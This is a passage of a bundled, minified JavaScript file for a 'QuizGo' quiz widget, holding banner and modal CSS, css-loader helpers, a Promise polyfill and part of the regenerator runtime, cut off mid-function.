let globalVars = {};
/* QuizGo 11-11-2023 */
/*! For license information please see widget.initializer.js.LICENSE.txt */
var QuizGoWidget;
!function () {
  var e = {
      291: function (e, t, n) {
        "use strict";

        var i = n(81),
          o = n.n(i),
          r = n(645),
          a = n.n(r)()(o());
        a.push([e.id, '.b-quizgo-banner{max-width:450px;margin:15px;border-radius:4px;text-rendering:optimizelegibility;position:fixed;z-index:99990;width:auto;-webkit-box-sizing:border-box;box-sizing:border-box;height:60px;display:-webkit-box;display:-ms-flexbox;display:flex;background-color:var(--quizgo-banner-background-color);color:var(--quizgo-banner-color);cursor:pointer}.b-quizgo-banner--full{margin:0px;border-radius:0px;max-width:100%;bottom:0px;left:0px;width:100%}.b-quizgo-banner--full .b-quizgo-banner__pulsar{border-radius:0px;padding-right:0px}.b-quizgo-banner--full .b-quizgo-banner__close{position:relative;right:auto;top:auto}.b-quizgo-banner--full .b-quizgo-banner__image{width:50px;margin-left:20px}.b-quizgo-banner--full .b-quizgo-banner__image svg{width:40px}.b-quizgo-banner--full .b-quizgo-banner__close{height:100%;width:60px;border-radius:0px;background:rgba(0,0,0,0.2);-webkit-box-shadow:none;box-shadow:none}.b-quizgo-banner--full .b-quizgo-banner__close svg{width:26px;height:26px}.b-quizgo-banner--full .b-quizgo-banner__close svg path{fill:var(--quizgo-banner-color) !important}.b-quizgo-banner--radius:not(.b-quizgo-banner--full){border-radius:60px}.b-quizgo-banner--radius:not(.b-quizgo-banner--full) .b-quizgo-banner__pulsar{border-radius:60px}.b-quizgo-banner--radius:not(.b-quizgo-banner--full) .b-quizgo-banner__image{margin-left:15px}.b-quizgo-banner--shadow{-webkit-box-shadow:var(--quizgo-banner-shadow-color) 0px 0px 4px 0px;box-shadow:var(--quizgo-banner-shadow-color) 0px 0px 4px 0px}.b-quizgo-banner--glare:after{content:"";position:absolute;top:0;bottom:0px;background:-webkit-gradient(linear, left top, right top, from(rgba(255,255,255,0.1)), to(rgba(255,255,255,0.6)));background:-o-linear-gradient(left, rgba(255,255,255,0.1), rgba(255,255,255,0.6) 100%);background:linear-gradient(90deg, rgba(255,255,255,0.1), rgba(255,255,255,0.6) 100%);width:45px;opacity:1;height:100%;-webkit-transform:skewX(-22deg);-ms-transform:skewX(-22deg);transform:skewX(-22deg);left:-65%;-webkit-animation-name:b-quizgo-banner__glare;animation-name:b-quizgo-banner__glare;-webkit-animation-duration:3s;animation-duration:3s;-webkit-animation-iteration-count:infinite;animation-iteration-count:infinite}.b-quizgo-banner__pulsar{display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;width:100%;border-radius:4px;padding-right:20px}.b-quizgo-banner--pulse .b-quizgo-banner__pulsar{-webkit-box-shadow:0 0 0 var(--quizgo-banner-shadow-color);box-shadow:0 0 0 var(--quizgo-banner-shadow-color);-webkit-animation:b-quizgo-banner__pulse 6s infinite;animation:b-quizgo-banner__pulse 6s infinite}.b-quizgo-banner--position-top{-webkit-animation-name:b-quizgo-banner__fade-in-down;animation-name:b-quizgo-banner__fade-in-down;-webkit-animation-duration:0.5s;animation-duration:0.5s;-webkit-animation-timing-function:ease-in;animation-timing-function:ease-in;opacity:0;-webkit-animation-fill-mode:both;animation-fill-mode:both;top:0;left:0}.b-quizgo-banner--position-bottom{-webkit-animation-name:b-quizgo-banner__fade-in-up;animation-name:b-quizgo-banner__fade-in-up;-webkit-animation-duration:0.5s;animation-duration:0.5s;-webkit-animation-timing-function:ease-in;animation-timing-function:ease-in;opacity:0;-webkit-animation-fill-mode:both;animation-fill-mode:both;left:0;bottom:0}.b-quizgo-banner--position-top-left{-webkit-animation-name:b-quizgo-banner__fade-in-right;animation-name:b-quizgo-banner__fade-in-right;-webkit-animation-duration:0.5s;animation-duration:0.5s;-webkit-animation-timing-function:ease-in;animation-timing-function:ease-in;opacity:0;-webkit-animation-fill-mode:both;animation-fill-mode:both;left:0;top:0}.b-quizgo-banner--position-top-right{-webkit-animation-name:b-quizgo-banner__fade-in-left;animation-name:b-quizgo-banner__fade-in-left;-webkit-animation-duration:0.5s;animation-duration:0.5s;-webkit-animation-timing-function:ease-in;animation-timing-function:ease-in;opacity:0;-webkit-animation-fill-mode:both;animation-fill-mode:both;right:0;top:0}.b-quizgo-banner--position-bottom-left{-webkit-animation-name:b-quizgo-banner__fade-in-right;animation-name:b-quizgo-banner__fade-in-right;-webkit-animation-duration:0.5s;animation-duration:0.5s;-webkit-animation-timing-function:ease-in;animation-timing-function:ease-in;opacity:0;-webkit-animation-fill-mode:both;animation-fill-mode:both;left:0;bottom:0}.b-quizgo-banner--position-bottom-right{-webkit-animation-name:b-quizgo-banner__fade-in-left;animation-name:b-quizgo-banner__fade-in-left;-webkit-animation-duration:0.5s;animation-duration:0.5s;-webkit-animation-timing-function:ease-in;animation-timing-function:ease-in;opacity:0;-webkit-animation-fill-mode:both;animation-fill-mode:both;right:0;bottom:0}.b-quizgo-banner__left{-o-text-overflow:ellipsis;text-overflow:ellipsis;overflow:hidden}.b-quizgo-banner__title{overflow:hidden;font-weight:bold;white-space:nowrap;font-size:10px;line-height:12px;-o-text-overflow:ellipsis;text-overflow:ellipsis;text-transform:uppercase;opacity:.9;padding-bottom:2px;letter-spacing:1px;color:var(--quizgo-banner-color)}.b-quizgo-banner__text{text-decoration:none;font-size:14px;-o-text-overflow:ellipsis;text-overflow:ellipsis;white-space:nowrap;overflow:hidden;line-height:16px;font-weight:bold;color:var(--quizgo-banner-color)}.b-quizgo-banner__content{display:-webkit-box;display:-ms-flexbox;display:flex;overflow:hidden;-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;-webkit-box-sizing:border-box;box-sizing:border-box;padding-left:10px;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-flex:1;-ms-flex:1;flex:1;height:100%;width:100%}.b-quizgo-banner__bonus{display:none;-webkit-box-align:center;-ms-flex-align:center;align-items:center;margin-left:33px;background:rgba(0,0,0,0.1);border-radius:35px 0 0 35px;height:100%}.b-quizgo-banner__bonus-image{position:relative;margin-right:15px;margin-left:20px}.b-quizgo-banner__bonus-count{width:14px;height:14px;display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;border-radius:50%;position:absolute;top:-5px;right:-5px;-webkit-box-shadow:0 3px 6px 0 rgba(0,0,0,0.33);box-shadow:0 3px 6px 0 rgba(0,0,0,0.33);background-color:#ed0000;color:#fff;font-size:9px;overflow:hidden;font-weight:bold}.b-quizgo-banner__bonus-text{font-size:14px;line-height:14px;font-weight:bold}.b-quizgo-banner__bonus-icon svg{width:30px;height:30px}.b-quizgo-banner__bonus-icon svg path{fill:var(--quizgo-banner-color)}.b-quizgo-banner__image{display:-ms-flexbox;display:-webkit-box;display:flex;width:40px;overflow:hidden;border-radius:4px;-ms-flex-negative:0;flex-shrink:0;margin:8px 0 8px 10px}.b-quizgo-banner__image svg{width:30px}.b-quizgo-banner__image svg path{fill:#fff;fill:var(--quizgo-banner-color, #fff)}.b-quizgo-banner__close{right:-4px;top:-4px;width:20px;height:20px;background:#f7f7f7;font-size:14px;font-weight:600;border-radius:50%;position:absolute;display:-ms-flexbox;display:-webkit-box;display:flex;-ms-flex-align:center;-webkit-box-align:center;align-items:center;-ms-flex-pack:center;-webkit-box-pack:center;justify-content:center;-webkit-box-shadow:0px 0px 2px 0px #d34085;box-shadow:0px 0px 2px 0px #d34085;-webkit-box-shadow:0px 0px 2px 0px var(--quizgo-banner-background-color, #d34085);box-shadow:0px 0px 2px 0px var(--quizgo-banner-background-color, #d34085)}.b-quizgo-banner__close svg{width:15px;height:15px}.b-quizgo-banner__close svg path{fill:#000 !important}@-webkit-keyframes b-quizgo-banner__fade-in-up{0%{-webkit-transform:translate3d(0, 70px, 0);transform:translate3d(0, 70px, 0);opacity:0;pointer-events:none}100%{-webkit-transform:translate3d(0, 0, 0);transform:translate3d(0, 0, 0);opacity:1;pointer-events:auto}}@keyframes b-quizgo-banner__fade-in-up{0%{-webkit-transform:translate3d(0, 70px, 0);transform:translate3d(0, 70px, 0);opacity:0;pointer-events:none}100%{-webkit-transform:translate3d(0, 0, 0);transform:translate3d(0, 0, 0);opacity:1;pointer-events:auto}}@-webkit-keyframes b-quizgo-banner__fade-in-down{0%{-webkit-transform:translate3d(0, -70px, 0);transform:translate3d(0, -70px, 0);opacity:0;pointer-events:none}100%{-webkit-transform:translate3d(0, 0, 0);transform:translate3d(0, 0, 0);opacity:1;pointer-events:auto}}@keyframes b-quizgo-banner__fade-in-down{0%{-webkit-transform:translate3d(0, -70px, 0);transform:translate3d(0, -70px, 0);opacity:0;pointer-events:none}100%{-webkit-transform:translate3d(0, 0, 0);transform:translate3d(0, 0, 0);opacity:1;pointer-events:auto}}@-webkit-keyframes b-quizgo-banner__glare{0%{left:-100%;opacity:0}25%{opacity:0}35%{opacity:0.8}55%{opacity:0}to{opacity:0;left:120%}}@keyframes b-quizgo-banner__glare{0%{left:-100%;opacity:0}25%{opacity:0}35%{opacity:0.8}55%{opacity:0}to{opacity:0;left:120%}}@-webkit-keyframes b-quizgo-banner__pulse{0%{-webkit-box-shadow:0 0 0 0 var(--quizgo-banner-shadow-color);box-shadow:0 0 0 0 var(--quizgo-banner-shadow-color)}30%{-webkit-box-shadow:0 0 0 5px var(--quizgo-banner-shadow-color);box-shadow:0 0 0 5px var(--quizgo-banner-shadow-color)}to{-webkit-box-shadow:0 0 0 0px white;box-shadow:0 0 0 0px white}}@keyframes b-quizgo-banner__pulse{0%{-webkit-box-shadow:0 0 0 0 var(--quizgo-banner-shadow-color);box-shadow:0 0 0 0 var(--quizgo-banner-shadow-color)}30%{-webkit-box-shadow:0 0 0 5px var(--quizgo-banner-shadow-color);box-shadow:0 0 0 5px var(--quizgo-banner-shadow-color)}to{-webkit-box-shadow:0 0 0 0px white;box-shadow:0 0 0 0px white}}@-webkit-keyframes b-quizgo-banner__fade-in-right{0%{-webkit-transform:translate3d(-200px, 0, 0);transform:translate3d(-200px, 0, 0);opacity:0;pointer-events:none}100%{-webkit-transform:translate3d(0, 0, 0);transform:translate3d(0, 0, 0);opacity:1;pointer-events:auto}}@keyframes b-quizgo-banner__fade-in-right{0%{-webkit-transform:translate3d(-200px, 0, 0);transform:translate3d(-200px, 0, 0);opacity:0;pointer-events:none}100%{-webkit-transform:translate3d(0, 0, 0);transform:translate3d(0, 0, 0);opacity:1;pointer-events:auto}}@-webkit-keyframes b-quizgo-banner__fade-in-left{0%{-webkit-transform:translate3d(200px, 0, 0);transform:translate3d(200px, 0, 0);opacity:0;pointer-events:none}100%{-webkit-transform:translate3d(0, 0, 0);transform:translate3d(0, 0, 0);opacity:1;pointer-events:auto}}@keyframes b-quizgo-banner__fade-in-left{0%{-webkit-transform:translate3d(200px, 0, 0);transform:translate3d(200px, 0, 0);opacity:0;pointer-events:none}100%{-webkit-transform:translate3d(0, 0, 0);transform:translate3d(0, 0, 0);opacity:1;pointer-events:auto}}@media (max-width: 465px){.b-quizgo-banner--full .b-quizgo-banner__close{background:none}.b-quizgo-banner--full .b-quizgo-banner__image{width:30px;margin-left:10px}.b-quizgo-banner--full .b-quizgo-banner__image svg{width:30px}}@media (min-width: 800px){.b-quizgo-banner--full{height:70px}.b-quizgo-banner--full .b-quizgo-banner__bonus{display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-sizing:border-box;box-sizing:border-box;-webkit-box-flex:1;-ms-flex:1;flex:1}.b-quizgo-banner--full .b-quizgo-banner__close{width:70px}}.b-quizgo-widget-blocked-body{overflow-y:hidden;position:fixed;width:100%}.b-quizgo-wrapper{background:rgba(0,0,0,0.68);width:100%;height:100%;position:fixed;top:0px;bottom:0px;left:0px;right:0px;display:none;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;z-index:2147483000;overflow-y:auto;overflow-scrolling:touch;-webkit-overflow-scrolling:touch}.b-quizgo-wrapper .b-quizgo-modal{background:#fff;width:100%;height:100%;position:relative;max-width:1200px;max-height:620px}.b-quizgo-wrapper .b-quizgo-modal iframe{display:block !important;width:100% !important;height:100% !important;border:0px !important}.b-quizgo-wrapper .b-quizgo-modal .b-quiz-start{background:#fff;width:100%;height:100%;position:absolute;top:0;left:0;z-index:1;display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center}.b-quizgo-modal__inner-block{position:absolute;display:-webkit-box;display:-ms-flexbox;display:flex;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,0);max-width:inherit;max-height:inherit}.b-quizgo-modal__inner-block .b-quiz-start{display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center}.b-quizgo-modal__inner-block iframe{width:100%;height:100%;border:0}.b-quiz-icon-close{position:absolute;display:inline-block;width:22px;height:22px;right:-26px;top:-26px;z-index:1000;overflow:hidden;opacity:.7;cursor:pointer}.b-quiz-icon-close:hover{opacity:.9}.b-quiz-icon-close::after,.b-quiz-icon-close::before{content:"";position:absolute;height:2px;width:100%;top:50%;left:0;margin-top:-1px;background:#fff}.b-quiz-icon-close::before{-webkit-transform:rotate(45deg);-ms-transform:rotate(45deg);transform:rotate(45deg)}.b-quiz-icon-close::after{-webkit-transform:rotate(-45deg);-ms-transform:rotate(-45deg);transform:rotate(-45deg)}.b-quizgo-wrapper__inner-block{background-color:rgba(0,0,100,0);z-index:auto;position:relative;width:100%;height:90vh;padding:0px;margin:0px auto;min-height:622px}.b-quizgo-wrapper__inner-block iframe{border:0px;width:100%;height:100%;position:absolute;left:0px;top:0px;right:0px;bottom:0px;overflow:hidden}.b-quizgo-wrapper__inner-block .b-quiz-start{width:100%;height:100%;display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center}.b-quizgo-wrapper__inner-block .b-quiz-start img{width:42px}@media (max-width: 1280px){.b-quiz-icon-close{background-color:rgba(255,255,255,0.7);width:28px;height:28px;right:0;top:0;border-radius:2px;border:1px solid #ccc}.b-quiz-icon-close::after,.b-quiz-icon-close::before{width:60%;background:#000;left:20%}}@media (min-width: 800px) and (max-height: 620px){.b-quizgo-wrapper .b-quizgo-modal{height:100vh !important}.b-quizgo-wrapper .b-quizgo-modal .b-quiz-question{height:100vh !important}}.b-quizgo-button-show-quiz{display:none;font-weight:500;text-align:center;vertical-align:middle;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;-webkit-transition:all .2s ease-out;-o-transition:all .2s ease-out;transition:all .2s ease-out;color:#fff;border:1px solid #d34085;background-color:#d34085;padding:18px 21px;font-size:22px;line-height:1;cursor:pointer;text-decoration:none !important;overflow:hidden;position:relative;margin:15px auto;width:-webkit-fit-content;width:-moz-fit-content;width:fit-content}@media (max-width: 800px){.b-quizgo__button-on-mobile.b-quizgo-wrapper__inner-block{display:none !important}.b-quizgo-wrapper{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.b-quizgo-wrapper .b-quizgo-modal{max-height:none;position:absolute;left:0px;right:0px;top:0px;bottom:0px;margin:0px}.b-quizgo-button-show-quiz{display:inline-block}}\n', ""]), t.Z = a;
      },
      645: function (e) {
        "use strict";

        e.exports = function (e) {
          var t = [];
          return t.toString = function () {
            return this.map(function (t) {
              var n = "",
                i = void 0 !== t[5];
              return t[4] && (n += "@supports (".concat(t[4], ") {")), t[2] && (n += "@media ".concat(t[2], " {")), i && (n += "@layer".concat(t[5].length > 0 ? " ".concat(t[5]) : "", " {")), n += e(t), i && (n += "}"), t[2] && (n += "}"), t[4] && (n += "}"), n;
            }).join("");
          }, t.i = function (e, n, i, o, r) {
            "string" == typeof e && (e = [[null, e, void 0]]);
            var a = {};
            if (i) for (var s = 0; s < this.length; s++) {
              var c = this[s][0];
              null != c && (a[c] = !0);
            }
            for (var l = 0; l < e.length; l++) {
              var u = [].concat(e[l]);
              i && a[u[0]] || (void 0 !== r && (void 0 === u[5] || (u[1] = "@layer".concat(u[5].length > 0 ? " ".concat(u[5]) : "", " {").concat(u[1], "}")), u[5] = r), n && (u[2] ? (u[1] = "@media ".concat(u[2], " {").concat(u[1], "}"), u[2] = n) : u[2] = n), o && (u[4] ? (u[1] = "@supports (".concat(u[4], ") {").concat(u[1], "}"), u[4] = o) : u[4] = "".concat(o)), t.push(u));
            }
          }, t;
        };
      },
      81: function (e) {
        "use strict";

        e.exports = function (e) {
          return e[1];
        };
      },
      301: function (e, t, n) {
        e.exports = n(702).Promise;
      },
      702: function (e, t, n) {
        e.exports = function () {
          "use strict";

          function e(e) {
            return "function" == typeof e;
          }
          var t = Array.isArray ? Array.isArray : function (e) {
              return "[object Array]" === Object.prototype.toString.call(e);
            },
            i = 0,
            o = void 0,
            r = void 0,
            a = function (e, t) {
              h[i] = e, h[i + 1] = t, 2 === (i += 2) && (r ? r(f) : w());
            };
          var s = "undefined" != typeof window ? window : void 0,
            c = s || {},
            l = c.MutationObserver || c.WebKitMutationObserver,
            u = "undefined" == typeof self && "undefined" != typeof process && "[object process]" === {}.toString.call(process),
            d = "undefined" != typeof Uint8ClampedArray && "undefined" != typeof importScripts && "undefined" != typeof MessageChannel;
          function p() {
            var e = setTimeout;
            return function () {
              return e(f, 1);
            };
          }
          var h = new Array(1e3);
          function f() {
            for (var e = 0; e < i; e += 2) (0, h[e])(h[e + 1]), h[e] = void 0, h[e + 1] = void 0;
            i = 0;
          }
          var b,
            g,
            m,
            v,
            w = void 0;
          function y(e, t) {
            var n = arguments,
              i = this,
              o = new this.constructor(_);
            void 0 === o[x] && Q(o);
            var r,
              s = i._state;
            return s ? (r = n[s - 1], a(function () {
              return P(s, o, r, i._result);
            })) : L(i, o, e, t), o;
          }
          function k(e) {
            if (e && "object" == typeof e && e.constructor === this) return e;
            var t = new this(_);
            return E(t, e), t;
          }
          w = u ? function () {
            return process.nextTick(f);
          } : l ? (g = 0, m = new l(f), v = document.createTextNode(""), m.observe(v, {
            characterData: !0
          }), function () {
            v.data = g = ++g % 2;
          }) : d ? ((b = new MessageChannel()).port1.onmessage = f, function () {
            return b.port2.postMessage(0);
          }) : void 0 === s ? function () {
            try {
              var e = n(327);
              return o = e.runOnLoop || e.runOnContext, function () {
                o(f);
              };
            } catch (e) {
              return p();
            }
          }() : p();
          var x = Math.random().toString(36).substring(16);
          function _() {}
          var z = void 0,
            q = new j();
          function S(e) {
            try {
              return e.then;
            } catch (e) {
              return q.error = e, q;
            }
          }
          function C(t, n, i) {
            n.constructor === t.constructor && i === y && n.constructor.resolve === k ? function (e, t) {
              1 === t._state ? T(e, t._result) : 2 === t._state ? M(e, t._result) : L(t, void 0, function (t) {
                return E(e, t);
              }, function (t) {
                return M(e, t);
              });
            }(t, n) : i === q ? M(t, q.error) : void 0 === i ? T(t, n) : e(i) ? function (e, t, n) {
              a(function (e) {
                var i = !1,
                  o = function (e, t, n, i) {
                    try {
                      e.call(t, n, i);
                    } catch (e) {
                      return e;
                    }
                  }(n, t, function (n) {
                    i || (i = !0, t !== n ? E(e, n) : T(e, n));
                  }, function (t) {
                    i || (i = !0, M(e, t));
                  }, e._label);
                !i && o && (i = !0, M(e, o));
              }, e);
            }(t, n, i) : T(t, n);
          }
          function E(e, t) {
            var n;
            e === t ? M(e, new TypeError("You cannot resolve a promise with itself")) : "function" == typeof (n = t) || "object" == typeof n && null !== n ? C(e, t, S(t)) : T(e, t);
          }
          function O(e) {
            e._onerror && e._onerror(e._result), A(e);
          }
          function T(e, t) {
            e._state === z && (e._result = t, e._state = 1, 0 !== e._subscribers.length && a(A, e));
          }
          function M(e, t) {
            e._state === z && (e._state = 2, e._result = t, a(O, e));
          }
          function L(e, t, n, i) {
            var o = e._subscribers,
              r = o.length;
            e._onerror = null, o[r] = t, o[r + 1] = n, o[r + 2] = i, 0 === r && e._state && a(A, e);
          }
          function A(e) {
            var t = e._subscribers,
              n = e._state;
            if (0 !== t.length) {
              for (var i = void 0, o = void 0, r = e._result, a = 0; a < t.length; a += 3) i = t[a], o = t[a + n], i ? P(n, i, o, r) : o(r);
              e._subscribers.length = 0;
            }
          }
          function j() {
            this.error = null;
          }
          var I = new j();
          function P(t, n, i, o) {
            var r = e(i),
              a = void 0,
              s = void 0,
              c = void 0,
              l = void 0;
            if (r) {
              if ((a = function (e, t) {
                try {
                  return e(t);
                } catch (e) {
                  return I.error = e, I;
                }
              }(i, o)) === I ? (l = !0, s = a.error, a = null) : c = !0, n === a) return void M(n, new TypeError("A promises callback cannot return that same promise."));
            } else a = o, c = !0;
            n._state !== z || (r && c ? E(n, a) : l ? M(n, s) : 1 === t ? T(n, a) : 2 === t && M(n, a));
          }
          var N = 0;
          function Q(e) {
            e[x] = N++, e._state = void 0, e._result = void 0, e._subscribers = [];
          }
          function B(e, n) {
            this._instanceConstructor = e, this.promise = new e(_), this.promise[x] || Q(this.promise), t(n) ? (this._input = n, this.length = n.length, this._remaining = n.length, this._result = new Array(this.length), 0 === this.length ? T(this.promise, this._result) : (this.length = this.length || 0, this._enumerate(), 0 === this._remaining && T(this.promise, this._result))) : M(this.promise, new Error("Array Methods must be provided an Array"));
          }
          function W(e) {
            this[x] = N++, this._result = this._state = void 0, this._subscribers = [], _ !== e && ("function" != typeof e && function () {
              throw new TypeError("You must pass a resolver function as the first argument to the promise constructor");
            }(), this instanceof W ? function (e, t) {
              try {
                t(function (t) {
                  E(e, t);
                }, function (t) {
                  M(e, t);
                });
              } catch (t) {
                M(e, t);
              }
            }(this, e) : function () {
              throw new TypeError("Failed to construct 'Promise': Please use the 'new' operator, this object constructor cannot be called as a function.");
            }());
          }
          function V() {
            var e = void 0;
            if (void 0 !== n.g) e = n.g;else if ("undefined" != typeof self) e = self;else try {
              e = Function("return this")();
            } catch (e) {
              throw new Error("polyfill failed because global object is unavailable in this environment");
            }
            var t = e.Promise;
            if (t) {
              var i = null;
              try {
                i = Object.prototype.toString.call(t.resolve());
              } catch (e) {}
              if ("[object Promise]" === i && !t.cast) return;
            }
            e.Promise = W;
          }
          return B.prototype._enumerate = function () {
            for (var e = this.length, t = this._input, n = 0; this._state === z && n < e; n++) this._eachEntry(t[n], n);
          }, B.prototype._eachEntry = function (e, t) {
            var n = this._instanceConstructor,
              i = n.resolve;
            if (i === k) {
              var o = S(e);
              if (o === y && e._state !== z) this._settledAt(e._state, t, e._result);else if ("function" != typeof o) this._remaining--, this._result[t] = e;else if (n === W) {
                var r = new n(_);
                C(r, e, o), this._willSettleAt(r, t);
              } else this._willSettleAt(new n(function (t) {
                return t(e);
              }), t);
            } else this._willSettleAt(i(e), t);
          }, B.prototype._settledAt = function (e, t, n) {
            var i = this.promise;
            i._state === z && (this._remaining--, 2 === e ? M(i, n) : this._result[t] = n), 0 === this._remaining && T(i, this._result);
          }, B.prototype._willSettleAt = function (e, t) {
            var n = this;
            L(e, void 0, function (e) {
              return n._settledAt(1, t, e);
            }, function (e) {
              return n._settledAt(2, t, e);
            });
          }, W.all = function (e) {
            return new B(this, e).promise;
          }, W.race = function (e) {
            var n = this;
            return t(e) ? new n(function (t, i) {
              for (var o = e.length, r = 0; r < o; r++) n.resolve(e[r]).then(t, i);
            }) : new n(function (e, t) {
              return t(new TypeError("You must pass an array to race."));
            });
          }, W.resolve = k, W.reject = function (e) {
            var t = new this(_);
            return M(t, e), t;
          }, W._setScheduler = function (e) {
            r = e;
          }, W._setAsap = function (e) {
            a = e;
          }, W._asap = a, W.prototype = {
            constructor: W,
            then: y,
            catch: function (e) {
              return this.then(null, e);
            }
          }, V(), W.polyfill = V, W.Promise = W, W;
        }();
      },
      666: function (e, t, n) {
        var i = n(301),
          o = function (e) {
            "use strict";

            var t,
              n = Object.prototype,
              o = n.hasOwnProperty,
              r = "function" == typeof Symbol ? Symbol : {},
              a = r.iterator || "@@iterator",
              s = r.asyncIterator || "@@asyncIterator",
              c = r.toStringTag || "@@toStringTag";
            function l(e, t, n) {
              return Object.defineProperty(e, t, {
                value: n,
                enumerable: !0,
                configurable: !0,
                writable: !0
              }), e[t];
            }
            try {
              l({}, "");
            } catch (e) {
              l = function (e, t, n) {
                return e[t] = n;
              };
            }
            function u(e, t, n, i) {
              var o = t && t.prototype instanceof m ? t : m,
                r = Object.create(o.prototype),
                a = new O(i || []);
              return r._invoke = function (e, t, n) {
                var i = p;
                return function (o, r) {
                  if (i === f) throw new Error("Generator is already running");
                  if (i === b) {
                    if ("throw" === o) throw r;
                    return M();
                  }
                  for (n.method = o, n.arg = r;;) {
                    var a = n.delegate;
                    if (a) {
                      var s = S(a, n);
                      if (s) {
                        if (s === g) continue;
                        return s;
                      }
                    }
                    if ("next" === n.method) n.sent = n._sent = n.arg;else if ("throw" === n.method) {
                      if (i === p) throw i = b, n.arg;
                      n.dispatchException(n.arg);
                    } else "return" === n.method && n.abrupt("return", n.arg);
                    i = f;
                    var c = d(e, t, n);
                    if ("normal" === c.type) {
                      if (i = n.done ? b : h, c.arg === g) continue;
                      return {
                        value: c.arg,
                        done: n.done
                      };
                    }
                    "throw" === c.type && (i = b, n.method = "throw", n.arg = c.arg);
                  }
                };
              }(e, n, a), r;
            }
            function d(e, t, n) {
              try {
                return {
                  type: "normal",
                  arg: e.call(t, n)
                };
              } catch (e) {
                return {
                  type: "throw",
                  arg: e
                };
              }
            }
            e.wrap = u;
            var p = "suspendedStart",
              h = "suspendedYield",
              f = "executing",
              b = "completed",
              g = {};
            function m() {}
            function v() {}
            function w() {}
            var y = {};
            l(y, a, function () {
              return this;
            });
            var k = Object.getPrototypeOf,
              x = k && k(k(T([])));
            x && x !== n && o.call(x, a) && (y = x);
            var _ = w.prototype = m.prototype = Object.create(y);
            function z(e) {
              ["next", "throw", "return"].forEach(function (t) {
                l(e, t, function (e) {
                  return this._invoke(t, e);
                });
              });
            }
            function q(e, t) {
              function n(i, r, a, s) {
                var c = d(e[i], e, r);
                if ("throw" !== c.type) {
                  var l = c.arg,
                    u = l.value;
                  return u && "object" == typeof u && o.call(u, "__await") ? t.resolve(u.__await).then(function (e) {
                    n("next", e, a, s);
                  }, function (e) {
                    n("throw", e, a, s);
                  }) : t.resolve(u).then(function (e) {
                    l.value = e, a(l);
                  }, function (e) {
                    return n("throw", e, a, s);
                  });
                }
                s(c.arg);
              }
              var i;
              this._invoke = function (e, o) {
                function r() {
                  return new t(function (t, i) {
                    n(e, o, t, i);
                  });
                }
                return i = i ? i.then(r, r) : r();
              };
            }
            function S(e, n) {
              var i = e.iterator[n.method];
              if (i === t) {
                if (n.delegate = null, "throw" === n.method) {
                  if (e.iterator.return && (n.method = "return", n.arg = t, S(e, n), "throw" === n.method)) return g;
                  n.method = "throw", n.arg = new TypeError("The iterator does not provide a 'throw' method");
                }
                return g;
              }
              var o = d(i, e.iterator, n.arg);
              if ("throw" === o.type) return n.method = "throw", n.arg = o.arg, n.delegate = null, g;
              var r = o.arg;
              return r ? r.done ? (n[e.resultName] = r.value, n.next = e.nextLoc, "return" !== n.method && (n.method = "next", n.arg = t), n.delegate = null, g) : r : (n.method = "throw", n.arg = new TypeError("iterator result is not an object"), n.delegate = null, g);
            }
            function C(e) {
              var t = {
                tryLoc: e[0]
              };
              1 in e && (t.catchLoc = e[1]), 2 in e && (t.finallyLoc = e[2], t.afterLoc = e[3]), this.tryEntries.push(t);
            }
            function E(e) {
              var t = e.completion || {};
              t.type = "normal", delete t.arg, e.completion = t;
            }
            function O(e) {
              this.tryEntries = [{
                tryLoc: "root"
              }], e.forEach(C, this), this.reset(!0);
            }
            function T(e) {
              if (e) {
                var n = e[a];
                if (n) return n.call(e);
                if ("function" == typeof e.next) return e;
                if (!isNaN(e.length)) {
                  var i = -1,
                    r = function n() {
                      for (; ++i < e.length;) if (o.call(e, i)) return n.value = e[i], n.done = !1, n;
                      return n.value = t, n.done = !0, n;
                    };
                  return r.next = r;
                }
              }
              return {
                next: M
              };
            }
            function M() {
              return {
                value: t,
                done: !0
              };
            }
            return v.prototype = w, l(_, "constructor", w), l(w, "constructor", v), v.displayName = l(w, c, "GeneratorFunction"), e.isGeneratorFunction = function (e) {
              var t = "function" == typeof e && e.constructor;
              return !!t && (t === v || "GeneratorFunction" === (t.displayName || t.name));
            }, e.mark = function (e) {
              return Object.setPrototypeOf ? Object.setPrototypeOf(e, w) : (e.__proto__ = w, l(e, c, "GeneratorFunction")), e.prototype = Object.create(_), e;
            }, e.awrap = function (e) {
              return {
                __await: e
              };
            }, z(q.prototype), l(q.prototype, s, function () {
              return this;
            }), e.AsyncIterator = q, e.async = function (t, n, o, r, a) {
              void 0 === a && (a = i);
              var s = new q(u(t, n, o, r), a);
              return e.isGeneratorFunction(n) ? s : s.next().then(function (e) {
                return e.done ? e.value : s.next();
              });
            }, z(_), l(_, c, "Generator"), l(_, a, function () {
              return this;
            }), l(_, "toString", function () {
              return "[object Generator]";
            }), e.keys = function (e) {
              var t = [];
              for (var n in e) t.push(n);
              return t.reverse(), function n() {
                for (; t.length;) {
                  var i = t.pop();
                  if (i in e) return n.value = i, n.done = !1, n;
                }
                return n.done = !0, n;
              };
            }, e.values = T, O.prototype = {
              constructor: O,
              reset: function (e) {
                if (this.prev = 0, this.next = 0, this.sent = this._sent = t, this.done = !1, this.delegate = null, this.method = "next", this.arg = t, this.tryEntries.forEach(E), !e) for (var n in this) "t" === n.charAt(0) && o.call(this, n) && !isNaN(+n.slice(1)) && (this[n] = t);
              },
              stop: function () {
